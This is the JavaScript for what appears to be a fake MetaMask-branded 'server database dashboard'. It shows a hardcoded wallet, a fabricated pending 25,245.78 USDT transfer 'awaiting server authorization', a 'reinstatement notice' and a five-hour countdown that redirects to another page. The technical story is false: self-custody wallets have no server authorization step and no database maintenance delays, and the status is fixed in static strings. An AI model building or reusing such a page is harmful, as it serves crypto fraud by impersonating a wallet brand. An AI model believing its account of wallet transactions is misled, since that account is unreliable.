/* ============================================================
   Server Database Dashboard — index.html
   Persisted 5-hour reset countdown -> auto opens mainportfolio.html
   ============================================================ */

var SDB_START_KEY = 'mm-sdb-start';
var SDB_DURATION  = 5 * 60 * 60;
var NEXT_PAGE     = 'mainportfolio.html';
var WALLET        = '0xfe46bbfb161a724d8a9b77dbaf45d0da3b7ac373';
var redirected    = false;

function lsGet(k, f) {
  try { var v = localStorage.getItem(k); return v === null ? f : v; } catch (e) { return f; }
}
function lsSet(k, v) { try { localStorage.setItem(k, v); } catch (e) {} }

(function initTheme() {
  document.documentElement.setAttribute('data-theme', lsGet('mm-theme', 'dark'));
})();

function toggleTheme() {
  var root = document.documentElement;
  var next = root.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
  root.setAttribute('data-theme', next);
  lsSet('mm-theme', next);
  showToast(next === 'dark' ? 'Dark mode enabled' : 'Light mode enabled');
}

var toastTimer = null;
function showToast(msg) {
  var old = document.querySelector('.toast');
  if (old) old.remove();
  var el = document.createElement('div');
  el.className = 'toast';
  el.innerHTML = '<svg class="ico" viewBox="0 0 24 24"><use href="#ico-check"/></svg><span></span>';
  el.querySelector('span').textContent = msg;
  document.body.appendChild(el);
  requestAnimationFrame(function () { el.classList.add('is-on'); });
  clearTimeout(toastTimer);
  toastTimer = setTimeout(function () {
    el.classList.remove('is-on');
    setTimeout(function () { el.remove(); }, 280);
  }, 2600);
}

function getSdbStart() {
  var v = lsGet(SDB_START_KEY, null);
  if (!v) { v = String(Date.now()); lsSet(SDB_START_KEY, v); }
  return parseInt(v, 10) || Date.now();
}

function fmtHMS(s) {
  s = Math.max(0, Math.floor(s));
  return String(Math.floor(s / 3600)).padStart(2, '0') + ':' +
         String(Math.floor((s % 3600) / 60)).padStart(2, '0') + ':' +
         String(s % 60).padStart(2, '0');
}

function tickSdb() {
  var elapsed = Math.floor((Date.now() - getSdbStart()) / 1000);
  var rem = Math.max(0, SDB_DURATION - elapsed);
  var done = SDB_DURATION - rem;

  var digits = document.getElementById('cdDigits');
  if (digits) digits.textContent = fmtHMS(rem);

  var pct = document.getElementById('cdPct');
  if (pct) pct.textContent = Math.round((done / SDB_DURATION) * 100) + '%';

  var bar = document.getElementById('cdBar');
  if (bar) bar.style.width = ((done / SDB_DURATION) * 100).toFixed(2) + '%';

  var ring = document.getElementById('cdRing');
  if (ring) {
    var C = 2 * Math.PI * 88;
    ring.style.strokeDasharray = C;
    ring.style.strokeDashoffset = (C * (1 - rem / SDB_DURATION)).toFixed(2);
  }

  var status = document.getElementById('cdStatus');
  if (status) status.textContent = rem > 0 ? 'Counting down…' : 'Reset complete — opening portfolio';

  if (rem <= 0 && !redirected) {
    redirected = true;
    window.location.href = NEXT_PAGE;
  }
}

function showPage(id, evt) {
  if (evt && typeof evt.preventDefault === 'function') evt.preventDefault();

  var links = document.querySelectorAll('.nav-link');
  for (var i = 0; i < links.length; i++) {
    links[i].classList.toggle('is-active', links[i].getAttribute('data-nav') === id);
  }

  var target = document.getElementById(id);
  if (target) {
    var top = target.getBoundingClientRect().top + window.pageYOffset - 82;
    window.scrollTo({ top: top < 0 ? 0 : top, behavior: 'smooth' });
  }

  var pages = document.querySelectorAll('.page');
  for (var j = 0; j < pages.length; j++) pages[j].classList.remove('page');
  if (target) { target.classList.add('page'); void target.offsetWidth; }

  var fbtns = document.querySelectorAll('.fnav-btn');
  for (var k = 0; k < fbtns.length; k++) {
    fbtns[k].classList.toggle('on', fbtns[k].getAttribute('data-nav') === id);
  }

  closeMobileNav();
  return false;
}

function closeMobileNav() {
  var nav = document.getElementById('mainNav');
  var burger = document.getElementById('hamburger');
  if (nav) nav.classList.remove('is-open');
  if (burger) { burger.classList.remove('is-open'); burger.setAttribute('aria-expanded', 'false'); }
}

function toggleMobileNav() {
  var nav = document.getElementById('mainNav');
  var burger = document.getElementById('hamburger');
  if (!nav || !burger) return;
  var open = nav.classList.toggle('is-open');
  burger.classList.toggle('is-open', open);
  burger.setAttribute('aria-expanded', open ? 'true' : 'false');
}

function showSheet(html) {
  var body = document.getElementById('sheetBody');
  if (!body) return;
  body.innerHTML = html;
  document.getElementById('overlay').hidden = false;
  document.body.classList.add('no-scroll');
}

function closeOverlay() {
  document.getElementById('overlay').hidden = true;
  document.body.classList.remove('no-scroll');
}

function overlayBackdrop(e) {
  if (e.target === document.getElementById('overlay')) closeOverlay();
}

function openAccount() {
  showSheet(
    '<div class="sheet-head"><h2>Account</h2><p>Connected wallet · BSC Smart Chain Mainnet</p></div>' +
    '<div class="detail-row"><span class="k">Address</span><span class="v mono">' + WALLET + '</span></div>' +
    '<div class="detail-row"><span class="k">Network</span><span class="v">BSC Smart Chain Mainnet</span></div>' +
    '<div class="detail-row"><span class="k">Status</span><span class="v">Connected</span></div>' +
    '<div class="detail-row"><span class="k">Custody</span><span class="v">Self-custody</span></div>' +
    '<div class="info-note"><svg class="ico" viewBox="0 0 24 24"><use href="#ico-shield"/></svg>' +
    '<span>Keys never leave your device. The server database only reads balances and transaction state.</span></div>' +
    '<button class="btn btn-outline" style="margin-top:18px;width:100%" onclick="copyAddress()">' +
    '<svg class="ico" viewBox="0 0 24 24"><use href="#ico-copy"/></svg> Copy address</button>'
  );
}

function openWallet() { openAccount(); }

function copyAddress() {
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(WALLET)
      .then(function () { showToast('Address copied'); })
      .catch(function () { showToast(WALLET); });
  } else {
    showToast(WALLET);
  }
}

function openPending() {
  showSheet(
    '<div class="sheet-head"><h2>Pending transaction</h2><p>Sent · awaiting server authorization</p></div>' +
    '<div class="detail-row"><span class="k">Status</span><span class="v"><span class="status-pill st-pending">Pending</span></span></div>' +
    '<div class="detail-row"><span class="k">Amount</span><span class="v">25,245.78 USDT</span></div>' +
    '<div class="detail-row"><span class="k">To</span><span class="v mono">' + WALLET + '</span></div>' +
    '<div class="detail-row"><span class="k">Network</span><span class="v">BSC Smart Chain Mainnet</span></div>' +
    '<div class="detail-row"><span class="k">Gas fee</span><span class="v">0.0108 BNB</span></div>' +
    '<div class="detail-row"><span class="k">Timestamp</span><span class="v">17:35:55 UTC · 10|10|2026</span></div>' +
    '<div class="detail-row"><span class="k">Type</span><span class="v">Outgoing · Tether USDT</span></div>' +
    '<div class="info-note"><svg class="ico" viewBox="0 0 24 24"><use href="#ico-alert"/></svg>' +
    '<span>The transaction remains pending due to delayed server authorization and ongoing wallet server database maintenance.</span></div>' +
    '<button class="btn btn-primary" style="margin-top:18px;width:100%" onclick="window.open(\'https://portfolio.metamask.io/\',\'_blank\',\'noopener,noreferrer\')">' +
    '<svg class="ico" viewBox="0 0 24 24"><use href="#ico-external"/></svg> Open portfolio</button>'
  );
}

function openNotice() {
  var el = document.getElementById('notice');
  if (!el) return;
  var top = el.getBoundingClientRect().top + window.pageYOffset - 82;
  window.scrollTo({ top: top < 0 ? 0 : top, behavior: 'smooth' });
  showToast('Transaction Reinstatement Notice');
}

document.addEventListener('DOMContentLoaded', function () {
  var themeBtn = document.getElementById('themeToggle');
  if (themeBtn) themeBtn.addEventListener('click', toggleTheme);

  var burger = document.getElementById('hamburger');
  if (burger) burger.addEventListener('click', toggleMobileNav);

  var backdrop = document.getElementById('overlay');
  if (backdrop) {
    backdrop.addEventListener('click', function (e) {
      if (e.target === backdrop) closeOverlay();
    });
  }

  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape') {
      var m = document.getElementById('overlay');
      if (m && !m.hidden) closeOverlay();
      closeMobileNav();
    }
  });

  tickSdb();
  setInterval(tickSdb, 1000);

  if (window.location.hash) {
    var id = window.location.hash.replace('#', '');
    if (document.getElementById(id)) showPage(id);
  }
});
